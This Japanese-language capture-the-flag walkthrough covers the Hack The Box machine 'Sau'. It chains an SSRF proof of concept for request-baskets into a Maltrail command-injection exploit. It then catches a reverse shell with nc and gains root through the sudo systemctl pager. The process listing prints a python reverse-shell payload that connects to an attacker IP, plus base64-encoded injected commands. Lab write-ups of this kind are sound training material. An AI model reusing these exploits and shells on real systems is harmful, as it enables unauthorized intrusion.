https://app.hackthebox.com/machines/Sau

## STEP 1
```sh
└─$ nmap -n -Pn -p- -sV 10.129.229.26                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 09:15 EDT
Nmap scan report for 10.129.229.26
Host is up (0.66s latency).

PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 1000 seconds
```


## STEP 2
55555番にアクセス
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Sau_01.png">  
`request-baskets`バージョン1.2.1には、CVE-2023-27163（SSRFの脆弱性）が存在する  
[PoC](https://github.com/entr0pie/CVE-2023-27163/tree/main)では、ターゲットで内部向けのポートへフォワーディングできる  
nmapの結果では80番がフィルタされていたのでPoCで確認してみる
```sh
└─$ wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh  
--2025-06-30 09:12:20--  https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1669 (1.6K) [text/plain]
Saving to: ‘CVE-2023-27163.sh’

CVE-2023-27163.sh                                          100%[========================================================================================================================================>]   1.63K  --.-KB/s    in 0s      

2025-06-30 09:12:21 (24.1 MB/s) - ‘CVE-2023-27163.sh’ saved [1669/1669]

└─$ chmod +x CVE-2023-27163.sh

└─$ ./CVE-2023-27163.sh       
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

Usage: CVE-2023-27163.sh <URL> <TARGET>

This PoC will create a vulnerable basket on a Request-Baskets (<= 1.2.1) server,
which will act as a proxy to other services and servers.

Arguments:
 URL            main path (/) of the server (eg. http://127.0.0.1:5000/)
 TARGET         r-baskets target server (eg. https://b5f5-138-204-24-206.ngrok-free.app/)

More info at https://github.com/entr0pie/CVE-2023-27163.

└─$ ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "mtpggm" proxy basket...
> Basket created!
> Accessing http://10.129.229.26:55555/mtpggm now makes the server request to http://127.0.0.1:80.
./CVE-2023-27163.sh: line 43: jq: command not found
> Response body (Authorization): {"token":"7QE7vU41tjWjcv3ki3lGO01uqgHnFUkunvY5jRfjXWzB"}
```
PoCで作成されたurlにアクセス、80番へのアクセスが成功した  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Sau_02.png">


## STEP 3
80番で動作している、Maltrail 0.53 にもrceの脆弱性がある  
[PoC](https://github.com/spookier/Maltrail-v0.53-Exploit)を確認すると、hxxp://x.x.x.x/loginに脆弱性があるっぽい  
ここでPoCのtarget_URLの部分を変更する（request basketsで生成したurlを使用するため）
```python
target_URL = sys.argv[3] + "/login"
↓
target_URL = sys.argv[3]
```
ここでPoCの通信を「hxxp://127.0.0.1/login」にフォワーディングするために、先程の「request baskets」を利用しPoC実行
```sh
└─$ ./CVE-2023-27163.sh http://10.129.200.37:55555 http://127.0.0.1:80/login
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "tcrcqh" proxy basket...
> Basket created!
> Accessing http://10.129.200.37:55555/tcrcqh now makes the server request to http://127.0.0.1:80/login.
./CVE-2023-27163.sh: line 43: jq: command not found
> Response body (Authorization): {"token":"8fGpaB2m8QH7NW0ne_6Rxd-l0B8LHvFtRjMoVpTutd5r"}

└─$ wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
--2025-07-02 02:09:48--  https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
Proxy request sent, awaiting response... 200 OK
Length: 2200 (2.1K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   2.15K  --.-KB/s    in 0s      

2025-07-02 02:09:49 (25.3 MB/s) - ‘exploit.py’ saved [2200/2200]

└─$ python3.13 exploit.py 10.10.16.4 4444 http://10.129.200.37:55555/tcrcqh
Running exploit on http://10.129.200.37:55555/tcrcqh
^C 
```
リバースシェルゲット！ユーザフラグゲット
```sh
└─$ nc -lnvp 4444                   
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.200.37] 44166

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

puma@sau:/opt/maltrail$ ^Z
zsh: suspended  nc -lnvp 4444

└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444
                               ^C

puma@sau:/opt/maltrail$ export SHELL=bash

puma@sau:/opt/maltrail$ export TERM=xterm-256color

puma@sau:/opt/maltrail$ stty rows 66 columns 236

puma@sau:/opt/maltrail$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)

puma@sau:/opt/maltrail$ cat /home/puma/user.txt
87961d03dd608aa3d7389921a468e5fd
```


## STEP 4
パスワードなしで、sudoでroot権限で「/usr/bin/systemctl status trail.service」が実行できるらしい
```sh
puma@sau:/opt/maltrail$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
systemctlコマンドで画面出力が`less`コマンドに渡される  
[リンク](https://gtfobins.github.io/gtfobins/systemctl/#sudo)を確認すると、lessコマンド中にシェルを開けることができ、ルートフラグゲット！
```sh
puma@sau:/opt/maltrail$ sudo systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2025-07-21 14:14:58 UTC; 8min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 878 (python3)
      Tasks: 12 (limit: 4662)
     Memory: 29.1M
     CGroup: /system.slice/trail.service
             ├─ 878 /usr/bin/python3 server.py
             ├─ 965 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed password for ;`echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAu>
             ├─ 967 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed password for ;`echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAu>
             ├─ 971 sh
             ├─ 975 python3 -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.7",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
             ├─ 976 /bin/sh
             ├─ 978 python3 -c import pty; pty.spawn("/bin/bash")
             ├─ 979 /bin/bash
             ├─1001 sudo systemctl status trail.service
             ├─1003 systemctl status trail.service
             └─1004 pager

Jul 21 14:14:58 sau systemd[1]: Started Maltrail. Server of malicious traffic detection system.
Jul 21 14:22:29 sau sudo[1000]:     puma : TTY=pts/1 ; PWD=/opt/maltrail ; USER=root ; COMMAND=list
Jul 21 14:23:16 sau sudo[1001]:     puma : TTY=pts/1 ; PWD=/opt/maltrail ; USER=root ; COMMAND=/usr/bin/systemctl status trail.service
Jul 21 14:23:16 sau sudo[1001]: pam_unix(sudo:session): session opened for user root by (uid=0)
!sh
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
961dc7484c3ca254d7a9d79dda1f41cb
```
